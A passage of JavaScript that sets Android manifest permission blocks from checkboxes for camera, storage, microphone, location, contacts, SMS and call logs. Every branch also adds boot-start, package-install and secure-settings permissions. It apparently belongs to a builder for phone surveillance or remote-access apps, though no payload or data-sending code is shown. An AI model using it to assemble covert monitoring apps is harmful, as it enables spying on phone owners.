            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
        //if three are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

           ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }



          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
